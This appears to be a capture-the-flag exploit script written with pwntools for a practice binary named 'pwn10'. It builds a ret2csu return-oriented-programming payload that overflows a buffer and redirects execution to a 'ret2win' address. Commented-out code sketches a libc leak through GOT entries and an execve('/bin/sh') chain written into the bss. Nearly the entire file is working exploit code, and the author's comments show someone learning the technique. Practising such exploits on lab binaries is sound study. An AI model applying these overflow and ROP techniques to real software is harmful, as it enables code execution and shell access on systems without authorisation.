from pwn import *
from LibcSearcher import *

#context.log_level = 'debug'

level5 = ELF('./pwn10')
sh = process('./pwn10')

puts_got = level5.got['puts']
read_got = level5.got['fgets']
main_addr = level5.symbols['main']
# ret_win = level5.symbols['ret2win']
ret_win = 0x00000000004007B1

initAdd = 0x601060

# bss_base = level5.bss()
# csu_front_addr = 0x0000000000400600
# csu_end_addr = 0x000000000040061A


csu_front_addr = 0x0000000000400880 # gadget 2.
csu_end_addr = 0x0000000000400896 # gadget 1, 

fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    #--- [cgl]
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13



    payload = 'a' * 32 + fakeebp # 0x80 offset to rbp, then 8 bytes to the ret_addr.
    

    ## put the address of the gadget 1
    payload += p64(csu_end_addr)
    payload += 'a'* 8 ## suplement for the additional rsp addition. i.e., add rsp, 38h.


    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    ## then put the address of the gadget 2, to call function
    payload += p64(csu_front_addr)

    ## 0x38. after gadget 2, we disable "jnz     short loc_4005F0", by setting rbx=0, and rbp=1. then we have rbx+1=rbp, do not jmp to loc_4005F0.
    ## , to reach to the retn again to invoke functions. therefore, therefore several pops.
    ## 6*8 = 48, six registers to pop. rbx,rbp,r12,r13,r14,r15
    ## [cgl]why?where is the additional pops?
    payload += 'a' * 0x38 
    payload += p64(last)
    gdb.attach(sh, 'b *0x0000000000400708')

    sh.sendafter(">", payload)

    # sh.send(payload)
    sleep(1)



# sh.recvuntil('> ')

## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
## write (r13d, r14, r15)
## print the address of write@PLT?

### can not directly like this. because it call from [r12+rbx*8], but not call r12+rbx*8.
csu(0, 1, ret_win, 0xdeadcafebabebeef, 0, 0, ret_win)


# sh.recvuntil('Hello, World\n')
# write_addr = u64(sh.recv(8))
# print "write_addr, ", hex(write_addr), write_addr
# libc = LibcSearcher('write', write_addr)
# libc_base = write_addr - libc.dump('write')
# execve_addr = libc_base + libc.dump('execve')
# log.success('execve_addr ' + hex(execve_addr))

# ## [cgl], why can we direct call execve, and put the string '/bin/sh\x00' into the r15?




# ## read(0,bss_base,16)
# ## read execve_addr and /bin/sh\x00
# sh.recvuntil('Hello, World\n')
# # csu(0, 1, read_got, 16, bss_base, 0, main_addr)
# csu(0, 1, read_got, 0, bss_base, 16, main_addr)

# sh.send(p64(execve_addr) + '/bin/sh\x00')

# sh.recvuntil('Hello, World\n')
# ## execve(bss_base+8)
# # csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
# csu(0, 1, bss_base, bss_base + 8, 0, 0, main_addr)

sh.interactive()